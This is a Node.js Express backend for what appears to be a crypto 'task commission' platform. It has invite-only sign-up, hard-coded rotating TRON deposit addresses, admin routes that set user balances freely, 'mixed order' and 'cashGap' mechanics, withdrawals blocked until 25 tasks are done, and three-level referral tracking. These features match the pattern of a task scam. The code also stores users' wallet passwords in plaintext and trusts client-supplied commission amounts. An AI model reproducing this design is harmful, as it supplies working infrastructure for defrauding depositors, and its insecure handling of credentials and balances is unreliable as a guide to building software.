require("dotenv").config();

const express = require("express");
const mongoose = require("mongoose");
const bcrypt = require("bcryptjs");
const jwt = require("jsonwebtoken");
const cron = require("node-cron");
const multer = require("multer");
const path = require("path");
const fs = require("fs");

const app = express();

const depositWallets = [

  {
    address: "TSNXDp4jH45dfCMyRvZQzbxGnCB3n9b6oc",
    qr: "qr111.png"
  },

  {
    address: "TTRuYV2FTxzD8LNF9vdLBh5r2d6uLXaqLW",
    qr: "qr222.png"
  },

  {
    address: "TSeebSLQExiSRsaQMvgap8v7EZHKeQLcNe",
    qr: "qr333.png"
  },

  {
    address: "THCXPUpL9fjMSA4h3EQ3BQQjCWuFtN6mBH",
    qr: "qr444.png"
  }

];

let currentWalletIndex = 0;

app.use(express.json({ limit: "50mb" }));
app.use(express.urlencoded({ limit: "50mb", extended: true }));

app.use(express.static("public"));

mongoose.connect(process.env.MONGO_URI)
  .then(() => console.log("DB Connected"))
  .catch(err => console.log("DB Error:", err));

const userSchema = new mongoose.Schema({
  username: {
    type: String,
    unique: true
  },

  inviteCode: {
    type: String,
    unique: true
  },

    referredBy: {
      type: String,
      default: ""
    },

    invitedUsers: {
      type: [String],
      default: []
    },

  password: String,

  profileImage: {
    type: String,
    default: "default.png"
  },

  balance: {
    type: Number,
    default: 0
  },

  todayTasks: {
    type: Number,
    default: 0
  },

  taskLimit: {
    type: Number,
    default: 0
  },

  todayCommission: {
    type: Number,
    default: 0
  },

  cashGap: {
    type: Number,
    default: 0
  },

  yesterdayCommission: {
    type: Number,
    default: 0
  },

  mixedOrderCount: {
    type: Number,
    default: 0
  },

  mixedOrderPositions: {
    type: [Number],
    default: []
  },

  normalMinCommission: {
    type: Number,
    default: 1
  },

  normalMaxCommission: {
    type: Number,
    default: 5
  },

  mixedCommissionRanges: {
  type: Object,
  default: {}
},

mixedOrderPercentRanges: {
  type: Object,
  default: {}
},

  lastResetDate: {
    type: String,
    default: ""
  },

  wallet: {
  name: {
    type: String,
    default: ""
  },

  protocol: {
    type: String,
    default: ""
  },

  address: {
    type: String,
    default: ""
  },

  password: {
    type: String,
    default: ""
  },

  locked: {
    type: Boolean,
    default: false
  }
}
}, {
  timestamps: true
});

const User = mongoose.model("User", userSchema);

async function generateInviteCode() {

  let code;
  let exists = true;

  while (exists) {

    code = Math.floor(100000 + Math.random() * 900000).toString();

    const user = await User.findOne({ inviteCode: code });

    if (!user) {
      exists = false;
    }
  }

  return code;
}

const depositSchema = new mongoose.Schema({
  username: String,
  amount: Number,

  walletAddress: String,
  walletQr: String,

  approvedAmount: { type: Number, default: 0 },
  status: { type: String, default: "Pending" },
  time: { type: Date, default: Date.now }
});
const Deposit = mongoose.model("Deposit", depositSchema);

const withdrawSchema = new mongoose.Schema({
  username: String,
  amount: Number,
  approvedAmount: { type: Number, default: 0 },
  status: { type: String, default: "Processing" },
  time: { type: Date, default: Date.now }
});
const Withdraw = mongoose.model("Withdraw", withdrawSchema);

const orderSchema = new mongoose.Schema({

  username: String,

  type: {
    type: String,
    enum: ["Amazon", "Alibaba", "AliExpress"],
    default: "Amazon"
  },

  status: {
    type: String,
    enum: ["pending", "complete"],
    default: "pending"
  },

  orderNo: String,

  trxTime: String,

  orderAmount: Number,

  commission: Number,

  products: [
    {
      name: String,
      price: Number,
      image: String,
      qty: Number
    }
  ]

}, {
  timestamps: true
});

const Order = mongoose.model("Order", orderSchema);

function verifyToken(req, res, next) {
  const authHeader = req.headers["authorization"];

  if (!authHeader) {
    return res.status(401).json({
      success: false,
      msg: "No token provided"
    });
  }

  try {
    const token = authHeader.split(" ")[1];
    const decoded = jwt.verify(token, process.env.JWT_SECRET);

    req.userId = decoded.id;
    next();

  } catch (err) {
    return res.status(401).json({
      success: false,
      msg: "Invalid token"
    });
  }
}

function verifyAdmin(req, res, next) {
  const authHeader = req.headers["authorization"];

  if (!authHeader) {
    return res.status(401).json({
      success: false,
      msg: "Admin token required"
    });
  }

  try {
    const token = authHeader.split(" ")[1];
    const decoded = jwt.verify(token, process.env.ADMIN_JWT_SECRET);

    if (decoded.role !== "admin") {
      return res.status(403).json({
        success: false,
        msg: "Access denied"
      });
    }

    next();

  } catch (err) {
    return res.status(401).json({
      success: false,
      msg: "Invalid admin token"
    });
  }
}

app.post("/register", async (req, res) => {

  try {

    const { username, password, inviteCode } = req.body;

    if (!username || !password || !inviteCode) {

      return res.json({
        success: false,
        msg: "Username, password and invite code required"
      });
    }

    const existingUser = await User.findOne({ username });

    if (existingUser) {

      return res.json({
        success: false,
        msg: "Username already exists"
      });
    }

    const inviter = await User.findOne({
      inviteCode: inviteCode
    });

    if (!inviter) {

      return res.json({
        success: false,
        msg: "Invalid invitation code"
      });
    }

    const hashedPassword = await bcrypt.hash(password, 10);

    const newInviteCode = await generateInviteCode();

    const user = new User({

      username,

      password: hashedPassword,

      inviteCode: newInviteCode,

      referredBy: inviter.username,

      balance: 0
    });

    inviter.invitedUsers.push(username);

    await inviter.save();

    await user.save();

    res.json({
      success: true,
      msg: "Registration successful"
    });

  } catch (err) {

    res.json({
      success: false,
      msg: err.message
    });
  }
});

app.post("/login", async (req, res) => {
  try {
    const { username, password } = req.body;

    if (!username || !password) {
      return res.status(400).json({
        success: false,
        msg: "Username and password required"
      });
    }

    const user = await User.findOne({ username });

    if (!user) {
      return res.status(401).json({
        success: false,
        msg: "User not found"
      });
    }

    const match = await bcrypt.compare(password, user.password);

    if (!match) {
      return res.status(401).json({
        success: false,
        msg: "Wrong password"
      });
    }

    const token = jwt.sign(
      { id: user._id },
      process.env.JWT_SECRET,
      { expiresIn: "365d" }
    );

    res.json({
  success: true,
  token,
  username: user.username,
  inviteCode: user.inviteCode
});

  } catch (err) {
    res.status(500).json({
      success: false,
      msg: err.message
    });
  }
});

const adminSchema = new mongoose.Schema({
  username: { type: String, unique: true },
  password: String
});

const Admin = mongoose.model("Admin", adminSchema);

app.post("/admin-login", async (req, res) => {
  try {
    const { username, password } = req.body;

    if (!username || !password) {
      return res.status(400).json({
        success: false,
        msg: "Username and password required"
      });
    }

    const admin = await Admin.findOne({ username });

    if (!admin) {
      return res.status(401).json({
        success: false,
        msg: "Admin not found"
      });
    }

    const match = await bcrypt.compare(password, admin.password);

    if (!match) {
      return res.status(401).json({
        success: false,
        msg: "Wrong password"
      });
    }

    const token = jwt.sign(
      {
        id: admin._id,
        role: "admin"
      },
      process.env.ADMIN_JWT_SECRET,
      { expiresIn: "12h" }
    );

    res.json({
      success: true,
      token
    });

  } catch (err) {
    res.status(500).json({
      success: false,
      msg: err.message
    });
  }
});

app.post("/deposit-request", verifyToken, async (req, res) => {
  try {
    const user = await User.findById(req.userId);
    const amount = Number(req.body.amount);

    if (!user || amount <= 0) {
      return res.json({ success: false, msg: "Invalid request" });
    }

    const pendingDeposit = await Deposit.findOne({
      username: user.username,
      status: "Pending"
    });

    if (pendingDeposit) {

  return res.json({
    pending: true,

    amount: pendingDeposit.amount,

    address: pendingDeposit.walletAddress,

    qr: pendingDeposit.walletQr,

    msg: "Previous deposit is pending"
  });

}

    const wallet = depositWallets[currentWalletIndex];

currentWalletIndex++;

if (currentWalletIndex >= depositWallets.length) {
  currentWalletIndex = 0;
}

const deposit = new Deposit({
  username: user.username,
  amount,

  walletAddress: wallet.address,
  walletQr: wallet.qr
});

    await deposit.save();

    res.json({
  success: true,

  address: wallet.address,

  qr: wallet.qr
});

  } catch (err) {
    console.log(err);
    res.json({ success: false, msg: err.message });
  }
});

app.get("/my-deposits", verifyToken, async (req, res) => {
  try {
    const user = await User.findById(req.userId);
    const deposits = await Deposit.find({ username: user.username }).sort({ time: -1 });
    res.json(deposits);
  } catch {
    res.json([]);
  }
});

app.get("/admin/deposits", verifyAdmin, async (req, res) => {
  const deposits = await Deposit.find().sort({ time: -1 });
  res.json(deposits);
});

app.post("/admin/approve", verifyAdmin, async (req, res) => {
  try {
    const { id, approvedAmount } = req.body;

    const deposit = await Deposit.findById(id);
    if (!deposit || deposit.status === "Success") {
      return res.json({ success: false, message: "Deposit not found" });
    }

    const user = await User.findOne({ username: deposit.username });
    if (!user) {
      return res.json({ success: false, message: "User not found" });
    }

    deposit.approvedAmount = Number(approvedAmount);
    deposit.status = "Success";

    user.balance += Number(approvedAmount);

    await user.save();
    await deposit.save();

    res.json({ success: true, message: "Deposit approved" });

  } catch (err) {
    res.json({ success: false, message: err.message });
  }
});

app.get("/balance", verifyToken, async (req, res) => {

  try {

    const user = await User.findById(req.userId);

    if (!user) {
      return res.json({
        balance: 0,
        cashGap: 0,
        todayTasks: 0,
        todayCommission: 0,
        yesterdayCommission: 0
      });
    }

    res.json({
      balance: user.balance || 0,
      cashGap: user.cashGap || 0,
      todayTasks: user.todayTasks || 0,
      todayCommission: user.todayCommission || 0,
      yesterdayCommission: user.yesterdayCommission || 0
    });

  } catch (err) {

    console.log(err);

    res.json({
      balance: 0,
      cashGap: 0,
      todayTasks: 0,
      todayCommission: 0,
      yesterdayCommission: 0
    });

  }

});

app.post("/withdraw", verifyToken, async (req, res) => {
  try {
    const user = await User.findById(req.userId);
    const amount = Number(req.body.amount || 0);

    if (!user) return res.json({ success: false, msg: "User not found" });
    if (amount <= 0) return res.json({ success: false, msg: "Invalid withdraw amount" });
    if (user.balance < amount) return res.json({ success: false, msg: "Not enough balance" });

if (user.taskLimit > 0) {

  if (user.todayTasks < user.taskLimit) {

    return res.json({
      success: false,
      msg: `You have not completed ${user.taskLimit} tasks yet, please complete ${user.taskLimit} tasks first.`
    });

  }

}

    const pendingWithdraw = await Withdraw.findOne({
      username: user.username,
      status: "Processing"
    });

    if (pendingWithdraw) {
      return res.json({
        success: false,
        msg: "Please wait for previous withdraw approval"
      });
    }

    const withdraw = new Withdraw({
      username: user.username,
      amount
    });

    await withdraw.save();

    res.json({
      success: true,
      msg: "Withdraw request submitted"
    });

  } catch (err) {
    res.json({
      success: false,
      msg: err.message
    });
  }
});

app.get("/my-withdraws", verifyToken, async (req, res) => {
  try {
    const user = await User.findById(req.userId);
    const withdraws = await Withdraw.find({ username: user.username }).sort({ time: -1 });
    res.json(withdraws);
  } catch {
    res.json([]);
  }
});

app.get("/admin/withdraws", verifyAdmin, async (req, res) => {
  const withdraws = await Withdraw.find().sort({ time: -1 });
  res.json(withdraws);
});

app.post("/admin/approve-withdraw", verifyAdmin, async (req, res) => {
  try {
    const { id, approvedAmount } = req.body;

    const withdraw = await Withdraw.findById(id);
    if (!withdraw || withdraw.status === "Success") {
      return res.json({ success: false, message: "Withdraw not found" });
    }

    const user = await User.findOne({ username: withdraw.username });
    if (!user) {
      return res.json({ success: false, message: "User not found" });
    }

    withdraw.approvedAmount = Number(approvedAmount);
    withdraw.status = "Success";

    user.balance -= Number(approvedAmount);

    await user.save();
    await withdraw.save();

    res.json({
      success: true,
      message: "Withdraw approved"
    });

  } catch (err) {
    res.json({
      success: false,
      message: err.message
    });
  }
});

app.post("/admin/allow-tasks", verifyAdmin, async (req, res) => {
  try {
    const {
      username,
      mixedCount,
      mixedPositions,
      mixedPercentRanges
    } = req.body;

    const user = await User.findOne({ username });

    if (!user) {
      return res.json({
        success: false,
        msg: "User not found"
      });
    }

    if (mixedCount > 0 && mixedPositions.length !== mixedCount) {
      return res.json({
        success: false,
        msg: "Mixed positions count must match mixedCount"
      });
    }

    user.todayTasks = 0;
    user.taskLimit = 25;

    user.mixedOrderCount = mixedCount || 0;
    user.mixedOrderPositions = mixedPositions || [];

    user.mixedOrderPercentRanges = mixedPercentRanges || {};

    await user.save();

    res.json({
      success: true,
      msg: "25 tasks assigned successfully"
    });

  } catch (err) {
    res.json({
      success: false,
      msg: err.message
    });
  }
});

app.get("/admin/users", verifyAdmin, async (req, res) => {
  try {
    const users = await User.find({}, { username: 1, _id: 0 });
    res.json(users);
  } catch {
    res.json([]);
  }
});

app.get("/admin/user-status/:username", verifyAdmin, async (req, res) => {
  try {
    const user = await User.findOne({ username: req.params.username });

    if (!user) {
      return res.json({
        success: false,
        msg: "User not found"
      });
    }

    res.json({
      success: true,
      user: {
        todayTasks: user.todayTasks || 0,
        taskLimit: user.taskLimit || 0,

        todayCommission: user.todayCommission || 0,
        yesterdayCommission: user.yesterdayCommission || 0,

        balance: user.balance || 0,
        cashGap: user.cashGap || 0,

        mixedOrderCount: user.mixedOrderCount || 0,
        mixedOrderPositions: user.mixedOrderPositions || [],

        normalMinCommission: user.normalMinCommission || 1,
        normalMaxCommission: user.normalMaxCommission || 5,

        mixedOrderPercentRanges: user.mixedOrderPercentRanges || {},

        wallet: user.wallet || {}
      }
    });

  } catch (err) {
    res.json({
      success: false,
      msg: err.message
    });
  }
});

app.post("/admin/update-balance", verifyAdmin, async (req, res) => {
  try {
    const { username, balance } = req.body;

    const user = await User.findOne({ username });

    if (!user) {
      return res.json({
        success: false,
        msg: "User not found"
      });
    }

    user.balance = Number(balance);
    await user.save();

    res.json({
      success: true,
      msg: "Balance updated successfully"
    });

  } catch (err) {
    res.json({
      success: false,
      msg: err.message
    });
  }
});

app.post("/save-order", verifyToken, async (req, res) => {

  try {

    const user = await User.findById(req.userId);

    if (!user) {
      return res.json({
        success: false,
        msg: "User not found"
      });
    }

    const {
      type,
      orderNo,
      trxTime,
      orderAmount,
      commission,
      products
    } = req.body;

    await Order.deleteMany({
      username: user.username,
      type,
      status: "pending"
    });

    const order = new Order({
      username: user.username,
      type,
      status: "pending",
      orderNo,
      trxTime,
      orderAmount,
      commission,
      products
    });

    await order.save();

    res.json({
      success: true
    });

  } catch (err) {

    res.json({
      success: false,
      msg: err.message
    });
  }
});

app.get("/my-orders", verifyToken, async (req, res) => {

  try {

    const user = await User.findById(req.userId);

    const orders = await Order.find({
      username: user.username
    }).sort({ createdAt: -1 });

    res.json({
      success: true,
      orders
    });

  } catch (err) {

    res.json({
      success: false,
      orders: []
    });
  }
});

app.post("/complete-order", verifyToken, async (req, res) => {

  try {

    const user = await User.findById(req.userId);

    const { orderNo } = req.body;

    const order = await Order.findOne({
      username: user.username,
      orderNo
    });

    if (!order) {
      return res.json({
        success: false,
        msg: "Order not found"
      });
    }

    order.status = "complete";

    await order.save();

    res.json({
      success: true
    });

  } catch (err) {

    res.json({
      success: false,
      msg: err.message
    });
  }
});

app.post("/save-cashgap", verifyToken, async (req, res) => {

  try {

    const user = await User.findById(req.userId);

    if (!user) {
      return res.json({
        success: false,
        msg: "User not found"
      });
    }

    user.cashGap = Number(req.body.cashGap || 0);

    await user.save();

    res.json({
      success: true
    });

  } catch (err) {

    res.json({
      success: false,
      msg: err.message
    });
  }
});

app.get("/task-status", verifyToken, async (req, res) => {
  try {
    const user = await User.findById(req.userId);

    if (!user) {
      return res.json({
        success: false,
        msg: "User not found"
      });
    }

    res.json({
      success: true,

      todayTasks: user.todayTasks || 0,
      taskLimit: user.taskLimit || 0,

      todayCommission: user.todayCommission || 0,
      yesterdayCommission: user.yesterdayCommission || 0,

      balance: user.balance || 0,
      cashGap: user.cashGap || 0,

      mixedOrderCount: user.mixedOrderCount || 0,
      mixedOrderPositions: user.mixedOrderPositions || [],

      normalMinCommission: user.normalMinCommission || 1,
      normalMaxCommission: user.normalMaxCommission || 5,

      mixedCommissionRanges: user.mixedCommissionRanges || {},

      mixedOrderPercentRanges: user.mixedOrderPercentRanges || {}
    });

  } catch (err) {
    res.json({
      success: false,
      msg: err.message
    });
  }
});

app.post("/add-commission", verifyToken, async (req, res) => {
  try {
    const user = await User.findById(req.userId);

    const { orderAmount, commission } = req.body;

    if (!user) {
      return res.json({ success: false, msg: "User not found" });
    }

    if (!orderAmount || !commission) {
      return res.json({ success: false, msg: "Invalid data" });
    }

    if (user.balance < orderAmount) {
      return res.json({
        success: false,
        msg: "Insufficient balance"
      });
    }

    user.balance += commission;
    
    user.todayCommission += commission;
    user.todayTasks += 1;
    user.cashGap = 0;

    await user.save();

    res.json({
      success: true,
      todayTasks: user.todayTasks,
      todayCommission: user.todayCommission,
      yesterdayCommission: user.yesterdayCommission,
      balance: user.balance
    });

  } catch (err) {
    res.json({ success: false, msg: err.message });
  }
});

cron.schedule("0 0 * * *", async () => {
  try {
    console.log("Running UK midnight reset...");

    const ukDate = new Date().toLocaleString("en-GB", {
      timeZone: "Europe/London"
    }).split(",")[0];

    const users = await User.find();

    for (const user of users) {

      user.yesterdayCommission += user.todayCommission;

      user.todayCommission = 0;

      user.lastResetDate = ukDate;

      await user.save();
    }

    console.log("All users reset successfully at UK midnight.");

  } catch (err) {
    console.log("Cron reset error:", err.message);
  }
}, {
  timezone: "Europe/London"
});

app.post("/save-wallet", verifyToken, async (req, res) => {

  try {

    const user = await User.findById(req.userId);

    if (!user) {
      return res.json({
        success: false,
        msg: "User not found"
      });
    }

    const {
      name,
      protocol,
      address,
      password
    } = req.body;

    user.wallet = {
      name,
      protocol,
      address,
      password,
      locked: true
    };

    await user.save();

    res.json({
      success: true,
      msg: "Wallet saved"
    });

  } catch (err) {

    res.json({
      success: false,
      msg: err.message
    });
  }
});

app.get("/get-wallet", verifyToken, async (req, res) => {

  try {

    const user = await User.findById(req.userId);

    if (!user) {

      return res.json({
        success: false,
        msg: "User not found"
      });
    }

    res.json({
      success: true,
      wallet: user.wallet || {}
    });

  } catch (err) {

    res.json({
      success: false,
      msg: err.message
    });
  }
});

app.post("/save-profile-image", verifyToken, async (req, res) => {

  try {

    const user = await User.findById(req.userId);

    if (!user) {
      return res.json({
        success: false,
        msg: "User not found"
      });
    }

    user.profileImage = req.body.image;

    await user.save();

    res.json({
      success: true,
      msg: "Profile image saved"
    });

  } catch (err) {

    res.json({
      success: false,
      msg: err.message
    });
  }
});

app.get("/get-profile-image", verifyToken, async (req, res) => {

  try {

    const user = await User.findById(req.userId);

    if (!user) {
      return res.json({
        success: false,
        msg: "User not found"
      });
    }

    res.json({
      success: true,
      image: user.profileImage || "default.png"
    });

  } catch (err) {

    res.json({
      success: false,
      msg: err.message
    });
  }
});

app.post("/admin/reset-user-password", verifyAdmin, async (req, res) => {

  try {

    const { username, newPassword } = req.body;

    if (!username || !newPassword) {
      return res.json({
        success: false,
        msg: "Username and new password required"
      });
    }

    const user = await User.findOne({ username });

    if (!user) {
      return res.json({
        success: false,
        msg: "User not found"
      });
    }

    const hashedPassword = await bcrypt.hash(newPassword, 10);

    user.password = hashedPassword;

    await user.save();

    res.json({
      success: true,
      msg: "User password reset successful"
    });

  } catch (err) {

    res.json({
      success: false,
      msg: err.message
    });
  }

});

app.post("/admin/reset-wallet", verifyAdmin, async (req, res) => {

  try {

    const { username } = req.body;

    const user = await User.findOne({ username });

    if (!user) {
      return res.json({
        success: false,
        msg: "User not found"
      });
    }

    user.wallet = {
      name: "",
      protocol: "",
      address: "",
      password: "",
      locked: false
    };

    await user.save();

    res.json({
      success: true,
      msg: "Wallet reset successful"
    });

  } catch (err) {

    res.json({
      success: false,
      msg: err.message
    });
  }

});

app.get("/deposit-wallet", (req, res) => {

  const wallet = depositWallets[currentWalletIndex];

  currentWalletIndex++;

  if (currentWalletIndex >= depositWallets.length) {
    currentWalletIndex = 0;
  }

  res.json({
    success: true,
    address: wallet.address,
    qr: wallet.qr
  });

});

app.get("/team-data", verifyToken, async (req, res) => {

  try {

    const user = await User.findById(req.userId);

    if (!user) {
      return res.json({
        success: false,
        msg: "User not found"
      });
    }

    async function buildUsers(users){

      const finalUsers = [];

      for(const u of users){

        const deposits = await Deposit.find({
          username: u.username,
          status: "Success"
        });

        let totalRecharge = 0;

        deposits.forEach(d=>{
          totalRecharge += d.approvedAmount || 0;
        });

        const withdraws = await Withdraw.find({
          username: u.username,
          status: "Success"
        });

        let totalWithdraw = 0;

        withdraws.forEach(w=>{
          totalWithdraw += w.approvedAmount || 0;
        });

        finalUsers.push({
          username: u.username,

          referredBy: u.referredBy,

          createdAt: u.createdAt,

          recharge: totalRecharge,

          withdraw: totalWithdraw,

          recommendedQuantity: u.invitedUsers
            ? u.invitedUsers.length
            : 0
        });
      }

      return finalUsers;
    }

    const rawLevel1 = await User.find({
      referredBy: user.username
    });

    const rawLevel2 = await User.find({
      referredBy: {
        $in: rawLevel1.map(u => u.username)
      }
    });

    const rawLevel3 = await User.find({
      referredBy: {
        $in: rawLevel2.map(u => u.username)
      }
    });

    const level1 = await buildUsers(rawLevel1);

    const level2 = await buildUsers(rawLevel2);

    const level3 = await buildUsers(rawLevel3);

    res.json({
      success: true,
      level1,
      level2,
      level3
    });

  } catch (err) {

    res.json({
      success: false,
      msg: err.message
    });
  }
});

app.get("/", (req, res) => {
  res.sendFile(__dirname + "/public/login.html");
});

/* ---------------- SERVER ---------------- */
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log("Server running...");
});